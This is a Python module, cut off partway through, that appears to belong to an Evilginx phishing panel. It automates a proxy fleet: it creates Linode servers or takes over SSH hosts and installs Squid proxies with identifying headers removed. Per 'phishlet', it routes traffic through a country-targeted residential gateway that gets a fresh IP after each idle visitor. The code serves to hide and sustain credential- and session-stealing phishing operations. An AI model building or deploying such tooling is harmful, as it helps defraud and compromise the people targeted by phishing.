#!/usr/bin/env python3
"""Linode proxy fleet + local CONNECT sidecar for Evilginx outbound."""

import base64
import io
import json
import os
import random
import re
import secrets
import select
import socket
import ssl
import string
import struct
import subprocess
import threading
import time
import urllib.error
import urllib.request

LINODE_API = "https://api.linode.com/v4"
SIDECAR_PORT = 18765
SQUID_PORT = 50100
CUSTOM_TYPES = ("http", "https", "socks5", "socks5h")
HIT_WINDOW = 15 * 60
HIT_LIMIT = 3
TAG = "egx-panel-proxy"
IMAGE = "linode/ubuntu22.04"
PLAN = "g6-nanode-1"
# Synthetic id for DataImpulse residential gateway (never a Linode / custom list row).
DI_PROXY_ID = -900001
DI_DEFAULT_HOST = "gw.dataimpulse.com"
DI_DEFAULT_PORT = 823
# After last DI tunnel for a phishlet closes, wait this long before next CONNECT gets a new sessid/IP.
DI_IDLE_ROTATE_SEC = 20

_lock = threading.RLock()
_used_lock = threading.Lock()
_settings_path = None
_phishlets_dir = None
_egx_config_path = None
_notify = None  # fn(title, message, ntype)
_used_mem = {}
_used_dirty = False
_tunnels = []
_tunnels_lock = threading.Lock()
_di_lock = threading.Lock()
# phishlet -> {sessid, open, last}
_di_runtime = {}


def init(settings_path, phishlets_dir, egx_config_path, notify_fn):
    global _settings_path, _phishlets_dir, _egx_config_path, _notify, _used_mem
    _settings_path = settings_path
    _phishlets_dir = phishlets_dir
    _egx_config_path = egx_config_path
    _notify = notify_fn
    try:
        _used_mem = dict((load().get("used_by") or {}))
    except Exception:
        _used_mem = {}
    threading.Thread(target=_used_flush_loop, daemon=True).start()


def _empty():
    return {
        "api_key": "",
        "proxies": [],
        "assignments": {},
        "current": {},
        "carousel": {},
        "hits": {},
        "used_by": {},
        "deploy": {"running": False, "step": "", "pct": 0, "error": ""},
        "manual_install": {
            "running": False, "step": "", "pct": 0, "error": "",
            "ok": False, "line": "", "ipv4": "", "port": SQUID_PORT,
        },
        "dataimpulse": {
            "login": "",
            "password": "",
            "host": DI_DEFAULT_HOST,
            "port": DI_DEFAULT_PORT,
            # ISO country for DI targeting, e.g. "us" → login__cr.us__sessid.HEX
            "country": "",
            "enabled": {},
        },
    }


def _di_cfg(s=None):
    s = s if s is not None else load()
    di = dict((s.get("dataimpulse") or {}))
    di.setdefault("login", "")
    di.setdefault("password", "")
    di.setdefault("host", DI_DEFAULT_HOST)
    di.setdefault("port", DI_DEFAULT_PORT)
    di.setdefault("country", "")
    di.setdefault("enabled", {})
    cc = re.sub(r"[^a-z]", "", str(di.get("country") or "").lower())
    di["country"] = cc[:2] if len(cc) >= 2 else ""
    return di


def _di_enabled(s, phishlet):
    if not phishlet:
        return False
    return bool((_di_cfg(s).get("enabled") or {}).get(phishlet))


def _di_sessid_for(phishlet, rotate=False):
    """Sticky sessid during an active visit; new sessid after idle gap (new visitor).

    Rotation is based on wall-clock idle since last tunnel activity, not the open
    counter alone — hung CONNECT pumps must not pin one residential IP forever.
    """
    with _di_lock:
        slot = _di_runtime.setdefault(phishlet, {"sessid": None, "open": 0, "last": 0.0})
        now = time.time()
        last = float(slot.get("last") or 0)
        idle = (now - last) if last else 1e9
        need = rotate or not slot.get("sessid") or idle >= DI_IDLE_ROTATE_SEC
        if need:
            slot["sessid"] = secrets.token_hex(8)
            slot["open"] = 0
            # Stamp now so parallel CONNECTs of the same visit keep this sessid.
            slot["last"] = now
        return slot["sessid"]


def _di_tunnel_open(phishlet):
    if not phishlet:
        return
    with _di_lock:
        slot = _di_runtime.setdefault(phishlet, {"sessid": None, "open": 0, "last": 0.0})
        slot["open"] = int(slot.get("open") or 0) + 1
        slot["last"] = time.time()


def _di_tunnel_close(phishlet):
    if not phishlet:
        return
    with _di_lock:
        slot = _di_runtime.setdefault(phishlet, {"sessid": None, "open": 0, "last": 0.0})
        slot["open"] = max(0, int(slot.get("open") or 0) - 1)
        slot["last"] = time.time()


def _di_runtime_public():
    with _di_lock:
        out = {}
        for pl, slot in _di_runtime.items():
            out[pl] = {
                "sessid": slot.get("sessid") or "",
                "open": int(slot.get("open") or 0),
                "last": int(slot.get("last") or 0),
            }
        return out


def _di_proxy_user(login, sessid, country=""):
    login = (login or "").strip()
    sessid = (sessid or "").strip()
    cc = re.sub(r"[^a-z]", "", str(country or "").lower())[:2]
    if cc:
        return "%s__cr.%s__sessid.%s" % (login, cc, sessid)
    return "%s__sessid.%s" % (login, sessid)


def _make_dataimpulse_proxy(phishlet, di=None):
    di = di or _di_cfg()
    login = (di.get("login") or "").strip()
    password = di.get("password") or ""
    host = (di.get("host") or DI_DEFAULT_HOST).strip() or DI_DEFAULT_HOST
    port = int(di.get("port") or DI_DEFAULT_PORT)
    if not login or not password:
        return None
    sessid = _di_sessid_for(phishlet)
    country = di.get("country") or ""
    user = _di_proxy_user(login, sessid, country)
    return {
        "id": DI_PROXY_ID,
        "kind": "dataimpulse",
        "label": "dataimpulse-%s" % phishlet,
        "ipv4": host,
        "port": port,
        "proxy_type": "http",
        "squid_user": user,
        "squid_pass": password,
        "status": "active",
        "phishlet": phishlet,
        "sessid": sessid,
        "country": country,
    }


def dataimpulse_public(s=None):
    s = s if s is not None else load()
    di = _di_cfg(s)
    pw = di.get("password") or ""
    return {
        "login": di.get("login") or "",
        "host": di.get("host") or DI_DEFAULT_HOST,
        "port": int(di.get("port") or DI_DEFAULT_PORT),
        "country": di.get("country") or "",
        "password_set": bool(pw),
        "password_mask": (("•" * max(4, len(pw) - 4)) + pw[-4:]) if pw else "",
        "enabled": dict(di.get("enabled") or {}),
        "runtime": _di_runtime_public(),
        "idle_rotate_sec": DI_IDLE_ROTATE_SEC,
    }


def save_dataimpulse_creds(login=None, password=None, host=None, port=None, country=None):
    """Update DataImpulse gateway credentials. Empty password keeps the previous one."""
    with _lock:
        s = load()
        di = _di_cfg(s)
        if login is not None:
            di["login"] = str(login).strip()
        if password is not None and str(password).strip() != "":
            di["password"] = str(password)
        if host is not None:
            di["host"] = (str(host).strip() or DI_DEFAULT_HOST)
        if port is not None:
            try:
                p = int(port)
            except Exception:
                p = DI_DEFAULT_PORT
            if not (1 <= p <= 65535):
                raise RuntimeError("bad DataImpulse port")
            di["port"] = p
        if country is not None:
            cc = re.sub(r"[^a-z]", "", str(country).lower())
            di["country"] = cc[:2] if len(cc) >= 2 else ""
        if not di.get("login"):
            raise RuntimeError("DataImpulse login required")
        if not di.get("password"):
            raise RuntimeError("DataImpulse password required")
        s["dataimpulse"] = di
        save(s)
    return dataimpulse_public()


def set_dataimpulse(phishlet, enabled):
    """Enable DataImpulse for a phishlet: detach every assigned Linode/custom hop first.

    Disable leaves the Linode/custom pool untouched so the user can re-assign later.
    """
    phishlet = (phishlet or "").strip()
    if not phishlet:
        raise RuntimeError("phishlet required")
    enabled = bool(enabled)
    killed = []
    with _lock:
        s = load()
        di = _di_cfg(s)
        if enabled:
            if not (di.get("login") or "").strip() or not (di.get("password") or ""):
                raise RuntimeError("save DataImpulse login/password first")
            assigned = [_as_id(i) for i in (s.get("assignments") or {}).get(phishlet) or []]
            killed = list(assigned)
            s.setdefault("assignments", {})[phishlet] = []
            s.setdefault("current", {})[phishlet] = None
            # Carousel is meaningless for a single rotating residential gateway.
            s.setdefault("carousel", {})[phishlet] = False
        di.setdefault("enabled", {})[phishlet] = enabled
        s["dataimpulse"] = di
        save(s)
    if killed:
        drop_proxy_tunnels(killed)
    drop_proxy_tunnels([DI_PROXY_ID])
    if enabled:
        ensure_evilginx_sidecar_proxy()
        # Force a fresh sessid for the next visitor after enable.
        with _di_lock:
            _di_runtime[phishlet] = {"sessid": None, "open": 0, "last": 0.0}
        if _notify:
            _notify(
                "DataImpulse on",
                "%s: residential gateway active — all Linode/custom hops detached. New sessid/IP after each idle visitor."
                % phishlet,
                "success",
            )
    else:
        with _di_lock:
            _di_runtime.pop(phishlet, None)
        if _notify:
            _notify("DataImpulse off", "%s: residential gateway disabled." % phishlet, "info")
    st = public_state()
    st["dataimpulse"] = dataimpulse_public()
    return st


def load():
    with _lock:
        if _settings_path and os.path.isfile(_settings_path):
            try:
                return json.load(open(_settings_path))
            except Exception:
                pass
        return _empty()


def save(s):
    with _lock:
        os.makedirs(os.path.dirname(_settings_path), exist_ok=True)
        tmp = _settings_path + ".tmp"
        with open(tmp, "w") as f:
            json.dump(s, f, indent=2)
        os.replace(tmp, _settings_path)


def _mi_empty():
    return {
        "running": False,
        "step": "",
        "pct": 0,
        "error": "",
        "ok": False,
        "line": "",
        "ipv4": "",
        "port": SQUID_PORT,
    }


def _mi_public(s=None, include_line=True):
    d = dict(_mi_empty())
    src = ((s if s is not None else load()).get("manual_install") or {})
    d.update({k: src.get(k, d[k]) for k in d})
    d["running"] = bool(d.get("running"))
    d["ok"] = bool(d.get("ok"))
    try:
        d["pct"] = max(0, min(100, int(d.get("pct") or 0)))
    except Exception:
        d["pct"] = 0
    try:
        d["port"] = int(d.get("port") or SQUID_PORT)
    except Exception:
        d["port"] = SQUID_PORT
    d["line"] = str(d.get("line") or "") if include_line else ""
    d["ipv4"] = str(d.get("ipv4") or "")
    d["step"] = str(d.get("step") or "")
    d["error"] = str(d.get("error") or "")
    return d


def _key(s=None):
    return (s or load()).get("api_key") or ""


def linode(method, path, body=None, key=None, timeout=40):
    token = key if key is not None else _key()
    if not token:
        raise RuntimeError("no linode api key")
    data = None if body is None else json.dumps(body).encode()
    req = urllib.request.Request(
        LINODE_API + path,
        data=data,
        method=method,
        headers={
            "Authorization": "Bearer " + token,
            "Content-Type": "application/json",
            "User-Agent": "evilginx-panel",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            return json.loads(raw.decode() or "{}")
    except urllib.error.HTTPError as e:
        err = e.read().decode("utf-8", "replace")[:500]
        raise RuntimeError(f"linode {e.code}: {err}") from e


def validate_key(key):
    try:
        linode("GET", "/profile", key=key.strip())
        return True, ""
    except Exception as e:
        return False, str(e)


_REGION_CONTINENT = {
    "us": "NORTH AMERICA", "ca": "NORTH AMERICA", "mx": "NORTH AMERICA",
    "de": "EUROPE", "gb": "EUROPE", "fr": "EUROPE", "nl": "EUROPE", "se": "EUROPE",
    "es": "EUROPE", "it": "EUROPE", "ie": "EUROPE", "fi": "EUROPE", "at": "EUROPE",
    "be": "EUROPE", "pl": "EUROPE", "ch": "EUROPE", "uk": "EUROPE",
    "sg": "ASIA PACIFIC", "jp": "ASIA PACIFIC", "au": "ASIA PACIFIC", "in": "ASIA PACIFIC",
    "id": "ASIA PACIFIC", "kr": "ASIA PACIFIC", "hk": "ASIA PACIFIC", "tw": "ASIA PACIFIC",
    "nz": "ASIA PACIFIC",
    "br": "SOUTH AMERICA", "cl": "SOUTH AMERICA", "ar": "SOUTH AMERICA",
    "za": "AFRICA", "ng": "AFRICA", "eg": "AFRICA",
    "il": "MIDDLE EAST", "ae": "MIDDLE EAST", "sa": "MIDDLE EAST",
}


def list_regions(key=None):
    data = linode("GET", "/regions", key=key)
    out = []
    for r in data.get("data") or []:
        caps = r.get("capabilities") or []
        if "Linodes" not in caps:
            continue
        cc = (r.get("country") or "").lower()
        city = r.get("label") or r.get("id") or ""
        out.append({
            "id": r.get("id"),
            "label": city,
            "country": cc,
            "city": city,
            "continent": _REGION_CONTINENT.get(cc, "OTHER"),
            "display": f"{cc.upper()}, {city} ({r.get('id')})",
        })
    order = ["NORTH AMERICA", "EUROPE", "ASIA PACIFIC", "SOUTH AMERICA", "AFRICA", "MIDDLE EAST", "OTHER"]
    out.sort(key=lambda x: (order.index(x["continent"]) if x["continent"] in order else 99, x["country"], x["label"]))
    return out


def public_ipv4():
    try:
        cfg = json.load(open(_egx_config_path))
        ip = (cfg.get("general") or {}).get("external_ipv4") or ""
        if ip:
            return ip
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ""


def _rand_user():
    return "px" + secrets.token_hex(3)


def _rand_pass():
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(18)) + "Aa1"


def _squid_install_script(user, password, allow_ip=None):
    """Squid hop used by Linode cloud-init and Manual Rise. Detects THIS machine's public IP."""
    return f"""#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
wait_apt() {{
  for i in $(seq 1 90); do
    busy=0
    for lk in /var/lib/dpkg/lock /var/lib/dpkg/lock-frontend /var/lib/apt/lists/lock /var/cache/apt/archives/lock; do
      fuser "$lk" >/dev/null 2>&1 && busy=1
    done
    [ "$busy" = 0 ] && return 0
    sleep 4
  done
  return 0
}}
self_ip() {{
  ip=""
  for u in https://api.ipify.org https://ifconfig.me https://icanhazip.com; do
    ip=$(curl -4 -fsS --max-time 8 "$u" 2>/dev/null | tr -d '\\r\\n[:space:]')
    echo "$ip" | grep -Eq '^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$' && {{ echo "$ip"; return 0; }}
  done
  ip=$(hostname -I 2>/dev/null | awk '{{print $1}}')
  echo "$ip" | grep -Eq '^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$' && {{ echo "$ip"; return 0; }}
  echo ""
}}
wait_apt
ok=0
for t in $(seq 1 8); do
  apt-get update -y && apt-get install -y squid apache2-utils ufw curl && ok=1 && break
  wait_apt
  sleep 5
done
[ "$ok" = 1 ] || {{ echo "apt install squid failed"; exit 1; }}
HELPER=""
for p in /usr/lib/squid/basic_ncsa_auth /usr/libexec/squid/basic_ncsa_auth /usr/lib/squid3/basic_ncsa_auth; do
  [ -x "$p" ] && HELPER="$p" && break
done
[ -n "$HELPER" ] || {{ echo "basic_ncsa_auth not found"; exit 1; }}
htpasswd -b -c /etc/squid/passwd {user} {password}
cat > /etc/squid/squid.conf << EOF
http_port {SQUID_PORT}
auth_param basic program $HELPER /etc/squid/passwd
auth_param basic realm proxy
auth_param basic credentialsttl 2 hours
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all
cache deny all
forwarded_for off
via off
dns_v4_first on
EOF
systemctl restart squid
systemctl enable squid
MYIP=$(self_ip)
ufw allow 22/tcp >/dev/null 2>&1 || true
ufw allow {SQUID_PORT}/tcp >/dev/null 2>&1 || true
ufw --force enable >/dev/null 2>&1 || true
ss -lnt | grep -q ':{SQUID_PORT}' || sleep 2
echo SQUID_READY
echo "ADD_LINE=${{MYIP:-UNKNOWN}}:{SQUID_PORT}@{user}:{password}"
"""


def _cloud_init(user, password, allow_ip):
    script = _squid_install_script(user, password, allow_ip)
    b64 = base64.b64encode(script.encode()).decode()
    return (
        "#cloud-config\n"
        "package_update: false\n"
        "package_upgrade: false\n"
        "write_files:\n"
        "  - path: /root/install-squid.sh\n"
        "    encoding: b64\n"
        "    permissions: '0755'\n"
        f"    content: {b64}\n"
        "runcmd:\n"
        "  - bash /root/install-squid.sh\n"
    )


def _clean_rise_user(v):
    v = re.sub(r"[^A-Za-z0-9]", "", str(v or ""))
    return v if len(v) >= 3 else ""


def _clean_rise_pass(v):
    v = re.sub(r"[^A-Za-z0-9._-]", "", str(v or ""))
    return v if len(v) >= 6 else ""


def manual_rise_bundle(user=None, password=None, allow_ip=None):
    """Same Squid hop as Linode Nanode cloud-init, for paste-on any Ubuntu."""
    user = _clean_rise_user(user) or _rand_user()
    password = _clean_rise_pass(password) or _rand_pass()
    return {
        "user": user,
        "password": password,
        "port": SQUID_PORT,
        "script": _squid_install_script(user, password),
    }


def _panel_pubkey():
    key_path = "/root/.ssh/id_ed25519"
    pub_path = key_path + ".pub"
    if not os.path.isfile(pub_path):
        os.makedirs("/root/.ssh", exist_ok=True)
        os.system(f'ssh-keygen -t ed25519 -N "" -f {key_path} >/dev/null 2>&1')
    try:
        return open(pub_path).read().strip()
    except Exception:
        return ""


def _ssh_run(ip, password, script, timeout=480):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    pkey = None
    try:
        pkey = paramiko.Ed25519Key.from_private_key_file("/root/.ssh/id_ed25519")
    except Exception:
        pkey = None
    last = None
    for _ in range(24):
        try:
            client.connect(
                ip, username="root", password=password or None, pkey=pkey,
                timeout=12, banner_timeout=25, auth_timeout=25,
                look_for_keys=False, allow_agent=False,
            )
            last = None
            break
        except Exception as e:
            last = e
            time.sleep(5)
    if last is not None:
        raise RuntimeError(f"ssh {ip}: {last}")
    try:
        stdin, stdout, stderr = client.exec_command(script, timeout=timeout)
        out = stdout.read().decode("utf-8", "replace")
        err = stderr.read().decode("utf-8", "replace")
        code = stdout.channel.recv_exit_status()
        return code, out, err
    finally:
        client.close()


def _wait_port(ip, port, timeout=240):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            s = socket.create_connection((ip, port), 6)
            s.close()
            return True
        except Exception:
            time.sleep(4)
    return False


_APT_IDLE_SH = r"""
export DEBIAN_FRONTEND=noninteractive
for i in $(seq 1 90); do
  busy=0
  pgrep -x apt-get >/dev/null 2>&1 && busy=1
  pgrep -x apt >/dev/null 2>&1 && busy=1
  pgrep -x dpkg >/dev/null 2>&1 && busy=1
  pgrep -x unattended-upgr >/dev/null 2>&1 && busy=1
  if command -v fuser >/dev/null 2>&1; then
    for lk in /var/lib/dpkg/lock /var/lib/dpkg/lock-frontend /var/lib/apt/lists/lock /var/cache/apt/archives/lock; do
      fuser "$lk" >/dev/null 2>&1 && busy=1
    done
  fi
  [ "$busy" = 0 ] && break
  sleep 4
done
echo APT_IDLE
"""

_CLOUD_STATUS_SH = "cloud-init status 2>/dev/null || echo 'status: unknown'"


def _wait_guest_ready(ip, root_pass, timeout=540, on_tick=None):
    """SSH up, cloud-init finished, apt idle, then extra 5s settle."""
    if not ip:
        return False, "no ipv4"
    if not _wait_port(ip, 22, min(240, timeout)):
        return False, "ssh port never opened"
    t0 = time.time()
    while time.time() - t0 < timeout:
        elapsed = int(time.time() - t0)
        if on_tick:
            on_tick(elapsed, "cloud-init")
        try:
            _code, out, _err = _ssh_run(ip, root_pass, _CLOUD_STATUS_SH, timeout=30)
        except Exception:
            time.sleep(6)
            continue
        low = (out or "").lower()
        if "status: done" in low or "status: disabled" in low or "status: error" in low:
            break
        time.sleep(6)
    if on_tick:
        on_tick(int(time.time() - t0), "apt")
    try:
        _ssh_run(ip, root_pass, _APT_IDLE_SH, timeout=360)
    except Exception:
        pass
    if on_tick:
        on_tick(int(time.time() - t0), "settle")
    time.sleep(5)
    return True, ""


def _install_squid(ip, root_pass, user, password, allow_ip):
    if not _wait_port(ip, 22, 240):
        return False, "ssh port never opened"
    script = _squid_install_script(user, password, allow_ip)
    try:
        code, out, err = _ssh_run(ip, root_pass, script, timeout=540)
    except Exception as e:
        return False, str(e)
    if code != 0:
        return False, (err or out or f"exit {code}")[-400:]
    ok = _squid_up(ip, user, password, timeout=90)
    return ok, ("" if ok else "squid installed but port 50100 not answering")


def _load_pkey_from_pem(pem, passphrase=None):
    import paramiko
    raw = (pem or "").replace("\r\n", "\n").replace("\r", "\n").strip()
    if not raw:
        raise RuntimeError("PEM key is empty")
    if "BEGIN PUBLIC KEY" in raw or "BEGIN SSH2 PUBLIC KEY" in raw:
        raise RuntimeError("this is a public key — paste the private PEM")
    if "PRIVATE KEY" not in raw and "BEGIN OPENSSH" not in raw:
        raise RuntimeError("not a private key (need -----BEGIN … PRIVATE KEY-----)")
    pw = passphrase if passphrase else None
    last = None
    for cls in (
        getattr(paramiko, "Ed25519Key", None),
        getattr(paramiko, "ECDSAKey", None),
        getattr(paramiko, "RSAKey", None),
        getattr(paramiko, "DSSKey", None),
    ):
        if cls is None:
            continue
        try:
            return cls.from_private_key(io.StringIO(raw), password=pw)
        except paramiko.PasswordRequiredException:
            raise RuntimeError("PEM key is encrypted — enter the key passphrase")
        except Exception as e:
            last = e
            continue
    raise RuntimeError("invalid PEM key: %s" % (last,))


def _ssh_exec(host, port, username, script, timeout=540, password=None, pkey=None, retries=6, retry_sleep=3):
    """SSH to an already-running box (Manual Install). Password XOR PEM — no panel key."""
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    last = None
    for _ in range(max(1, int(retries))):
        try:
            client.connect(
                hostname=host,
                port=int(port),
                username=username,
                password=password if password else None,
                pkey=pkey,
                timeout=12,
                banner_timeout=25,
                auth_timeout=25,
                look_for_keys=False,
                allow_agent=False,
            )
            last = None
            break
        except Exception as e:
            last = e
            time.sleep(retry_sleep)
    if last is not None:
        raise RuntimeError("ssh %s:%s: %s" % (host, port, last))
    try:
        cmd = "bash -s" if username == "root" else "sudo -n bash -s"
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        stdin.write(script if script.endswith("\n") else script + "\n")
        stdin.flush()
        stdin.channel.shutdown_write()
        out = stdout.read().decode("utf-8", "replace")
        err = stderr.read().decode("utf-8", "replace")
        code = stdout.channel.recv_exit_status()
        return code, out, err
    finally:
        try:
            client.close()
        except Exception:
            pass


def _parse_squid_add_line(out):
    m = re.search(
        r"ADD_LINE=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+|UNKNOWN):(\d+)@([^:\s]+):(\S+)",
        out or "",
    )
    if not m:
        return None
    ip = m.group(1)
    if ip == "UNKNOWN":
        ip = ""
    return {
        "ipv4": ip,
        "port": int(m.group(2)),
        "user": m.group(3),
        "password": m.group(4),
    }


def _set_mi(**kw):
    with _lock:
        s = load()
        d = s.get("manual_install")
        if not isinstance(d, dict):
            d = _mi_empty()
        else:
            base = _mi_empty()
            base.update(d)
            d = base
        d.update(kw)
        s["manual_install"] = d
        save(s)
        return dict(d)


def _clean_ssh_host(v):
    v = (v or "").strip()
    if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", v):
        return v
    if re.match(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,253}$", v):
        return v
    raise RuntimeError("invalid server IP / hostname")


def _clean_ssh_login(v):
    v = (v or "").strip() or "root"
    if not re.match(r"^[A-Za-z0-9._-]{1,32}$", v):
        raise RuntimeError("invalid SSH login")
    return v


def manual_install_status():
    return _mi_public()


def manual_install_start(ip, port=22, login="root", password="", use_pem=False, pem="", pem_pass=""):
    host = _clean_ssh_host(ip)
    try:
        ssh_port = int(port or 22)
    except Exception:
        raise RuntimeError("invalid SSH port")
    if not (1 <= ssh_port <= 65535):
        raise RuntimeError("invalid SSH port")
    user = _clean_ssh_login(login)
    use_pem = bool(use_pem)
    password = password if isinstance(password, str) else ""
    pem = pem if isinstance(pem, str) else ""
    pem_pass = pem_pass if isinstance(pem_pass, str) else ""
    if use_pem:
        if len(pem) > 65536:
            raise RuntimeError("PEM key is too large")
        _load_pkey_from_pem(pem, pem_pass or None)
        password = ""
    else:
        pem = ""
        pem_pass = ""
        if not password:
            raise RuntimeError("SSH password required")
        if len(password) > 256:
            raise RuntimeError("SSH password is too long")
    with _lock:
        s = load()
        cur = s.get("manual_install") or {}
        if cur.get("running"):
            raise RuntimeError("install already running")
        s["manual_install"] = {
            "running": True, "ok": False, "pct": 2, "error": "",
            "step": "queued", "line": "", "ipv4": "", "port": SQUID_PORT,
        }
        save(s)
    t = threading.Thread(
        target=_manual_install_worker,
        args=(host, ssh_port, user, password, use_pem, pem, pem_pass),
        daemon=True,
    )
    t.start()
    return _mi_public()


def _manual_install_worker(host, ssh_port, username, password, use_pem, pem, pem_pass):
    squid_user, squid_pass = _rand_user(), _rand_pass()
    pkey = None
    hop_ip = host if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host) else ""
    try:
        if use_pem:
            pkey = _load_pkey_from_pem(pem, pem_pass or None)
        _set_mi(running=True, ok=False, pct=8, error="", step="waiting for SSH %s:%s" % (host, ssh_port), line="")
        if not _wait_port(host, ssh_port, timeout=45):
            raise RuntimeError("SSH port %s:%s is closed" % (host, ssh_port))
        _set_mi(pct=18, step="SSH up — checking apt")
        try:
            _ssh_exec(
                host, ssh_port, username, _APT_IDLE_SH, timeout=180,
                password=password or None, pkey=pkey, retries=8, retry_sleep=3,
            )
        except Exception:
            pass
        _set_mi(pct=36, step="installing Squid (same as Linode Nanode)")
        script = _squid_install_script(squid_user, squid_pass)
        code, out, err = _ssh_exec(
            host, ssh_port, username, script, timeout=540,
            password=password or None, pkey=pkey, retries=4, retry_sleep=4,
        )
        parsed = _parse_squid_add_line(out)
        if parsed and parsed.get("ipv4"):
            hop_ip = parsed["ipv4"]
        if not hop_ip:
            hop_ip = host
        if code != 0:
            msg = (err or out or "exit %s" % code)[-400:]
            if "password is required" in (err or "").lower() or "sudo:" in (err or "").lower():
                msg = "need root (sudo -n failed for user %s)" % username
            raise RuntimeError(msg)
        if "SQUID_READY" not in (out or ""):
            raise RuntimeError((err or out or "squid script did not print SQUID_READY")[-400:])
        _set_mi(pct=78, step="checking %s:%s" % (hop_ip, SQUID_PORT), ipv4=hop_ip)
        ok = _squid_up(hop_ip, squid_user, squid_pass, timeout=90)
        if not ok and hop_ip != host:
            ok = _squid_up(host, squid_user, squid_pass, timeout=25)
            if ok:
                hop_ip = host
        if not ok:
            raise RuntimeError("squid installed but port %s is not answering from this panel" % SQUID_PORT)
        line = "%s:%s@%s:%s" % (hop_ip, SQUID_PORT, squid_user, squid_pass)
        recs = [{
            "ipv4": hop_ip,
            "port": SQUID_PORT,
            "squid_user": squid_user,
            "squid_pass": squid_pass,
            "proxy_type": "http",
        }]
        added, skipped, _st = add_custom_proxies(recs)
        _set_mi(
            running=False, ok=True, pct=100, error="",
            step="Squid ready — added as custom HTTP proxy" if added else (
                "Squid ready — already in the list" if skipped else "Squid ready"
            ),
            line=line, ipv4=hop_ip, port=SQUID_PORT,
        )
        if _notify:
            _notify(
                "Manual Install done",
                "%s:%s squid is up%s." % (hop_ip, SQUID_PORT, " and added to Custom" if added else ""),
                "success",
            )
    except Exception as e:
        _set_mi(
            running=False, ok=False, pct=0,
            error=str(e)[:400],
            step="failed",
            line="", ipv4=hop_ip or "", port=SQUID_PORT,
        )
        if _notify:
            _notify("Manual Install failed", "%s: %s" % (host, e), "error")


def domain_to_phishlet(host):
    host = (host or "").split(":")[0].lower().lstrip(".")
    if not _phishlets_dir or not os.path.isdir(_phishlets_dir):
        return ""
    for fn in os.listdir(_phishlets_dir):
        if not fn.endswith((".yaml", ".yml")):
            continue
        try:
            txt = open(os.path.join(_phishlets_dir, fn), encoding="utf-8", errors="replace").read()
        except Exception:
            continue
        for m in re.finditer(r"domain:\s*['\"]([^'\"]+)['\"]", txt):
            d = m.group(1).lower()
            if host == d or host.endswith("." + d):
                return os.path.splitext(fn)[0]
    return ""


def _as_id(x):
    try:
        return int(x)
    except Exception:
        return x


def _is_custom(p):
    if not p:
        return False
    if (p.get("kind") or "") == "custom":
        return True
    try:
        return int(p.get("id")) < 0
    except Exception:
        return False


def _is_custom_id(px_id):
    try:
        return int(px_id) < 0
    except Exception:
        return False


def _next_custom_id(s):
    ids = []
    for p in s.get("proxies") or []:
        try:
            i = int(p.get("id"))
        except Exception:
            continue
        if i < 0:
            ids.append(i)
    return (min(ids) - 1) if ids else -1


def _parse_one_proxy_line(line):
    """Accept ip:port@login:pass, user:pass@ip:port, ip:port:login:pass, ip:port."""
    s = (line or "").strip()
    if not s:
        raise ValueError("empty")
    s = re.sub(r"^(https?|socks5h?)://", "", s, flags=re.I)
    user, password = "", ""
    m = re.match(
        r"^(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})@([^:@\s]+):(.*)$",
        s,
    )
    if m:
        host, port_s, user, password = m.group(1), m.group(2), m.group(3), m.group(4)
        port = int(port_s)
        if not (1 <= port <= 65535):
            raise ValueError("bad port")
        return {"ipv4": host, "port": port, "user": user, "password": password}
    if "@" in s:
        left, right = s.split("@", 1)
        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}:\d{1,5}$", left):
            host, port_s = left.rsplit(":", 1)
            port = int(port_s)
            if ":" in right:
                user, password = right.split(":", 1)
            else:
                user, password = right, ""
            if not (1 <= port <= 65535):
                raise ValueError("bad port")
            return {"ipv4": host, "port": port, "user": user, "password": password}
        hostport = right
        if ":" in left:
            user, password = left.split(":", 1)
        else:
            user, password = left, ""
        host, port_s = hostport.rsplit(":", 1)
        port = int(port_s)
        if not (1 <= port <= 65535):
            raise ValueError("bad port")
        return {"ipv4": host, "port": port, "user": user, "password": password}
    parts = s.split(":")
    if len(parts) == 2:
        host, port = parts[0], int(parts[1])
        if not (1 <= port <= 65535):
            raise ValueError("bad port")
        return {"ipv4": host, "port": port, "user": "", "password": ""}
    if len(parts) >= 4:
        host, port_s, user = parts[0], parts[1], parts[2]
        password = ":".join(parts[3:])
        port = int(port_s)
        if not (1 <= port <= 65535):
            raise ValueError("bad port")
        return {"ipv4": host, "port": port, "user": user, "password": password}
    raise ValueError("use ip:port@login:pass")


def parse_custom_lines(text, ptype="http"):
    ptype = (ptype or "http").strip().lower()
    if ptype not in CUSTOM_TYPES:
        raise RuntimeError("proxy type must be http, https, socks5 or socks5h")
    recs, errors = [], []
    for n, raw in enumerate((text or "").splitlines(), 1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        try:
            one = _parse_one_proxy_line(line)
        except (ValueError, TypeError) as e:
            errors.append("line %s: %s" % (n, e))
            continue
        recs.append({
            "kind": "custom",
            "proxy_type": ptype,
            "ipv4": one["ipv4"],
            "port": int(one["port"]),
            "squid_user": one.get("user") or "",
            "squid_pass": one.get("password") or "",
            "status": "active",
        })
    return recs, errors


def add_custom_proxies(recs):
    """Insert custom hops into the same proxies[] list Linode uses. Negative ids."""
    added, skipped = 0, 0
    with _lock:
        s = load()
        existing = set()
        for p in s.get("proxies") or []:
            existing.add((
                p.get("ipv4") or "",
                int(p.get("port") or 0),
                p.get("squid_user") or "",
                (p.get("proxy_type") or "http").lower(),
